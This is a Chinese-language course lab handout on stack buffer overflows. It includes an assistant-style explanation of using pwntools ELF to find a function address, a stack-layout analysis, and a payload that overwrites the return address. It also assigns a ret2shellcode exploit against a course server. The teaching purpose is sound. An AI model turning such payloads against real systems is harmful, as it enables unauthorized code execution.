# lab01-缓冲区溢出

## 栈上缓冲区溢出

### Task 1

#### 请阅读 sbof1.c 和 example.py，关注脚本中：

- 学会使用 pwntools 中的 ELF，其可以方便的辅助得到代码下符号的地址、字符串地址、GOT 表等信息
- 学会根据读汇编代码理解如何计算缓冲区长度以及如何覆盖返回地址的

好的,我已经阅读了您提供的代码文件。根据您的要求,我将用中文回复并重点关注您提到的几个方面:

1. 使用 pwntools 中的 ELF:

```python:cs144/SSecAnyaZJU/lab-01/sbof/example.py
binary = ELF("./sbof1") # 分析目标程序
target_code_addr = binary.symbols["target_code"]
```

使用 ELF 类来分析目标程序,并通过 `binary.symbols["target_code"]` 获取 `target_code` 函数的地址。

2. 通过汇编代码理解缓冲区长度和返回地址覆盖:

- 栈帧大小为 0x50 (`sub rsp,0x50`)
- 缓冲区从 [rbp - 0x50] 开始,到 [rbp - 0x10] 结束
- len 变量位于 [rbp - 0x4]
- 需要额外 0x18 字节来覆盖返回地址

根据这些信息,payload 的构造如下:

```python:cs144/SSecAnyaZJU/lab-01/sbof/example.py
payload = b""
payload += b"A" * 0x40  # 1. 填充原始缓冲区
payload += b"B" * 0x10  # 2. 填充剩余空间
payload += b"C" * 0x8   # 3. 填充帧指针
payload += p64(target_code_addr)    # 4. 填充返回地址
payload = payload + b"D" * (128 - len(payload)) # 5. 填充剩余空间
```

#### 实践：

请阅读 sbof2.c，并在理解 example.py 的基础上编写攻击代码，实现 ret2shellcode 攻击的本地测试和远程测试，该服务暴露在：

IP: 8.154.20.109, PORT: 10100

请截图证明远程成功拿 shell，并将攻击代码以附件形式提交 (下图为获取到 flag 的截图示例)
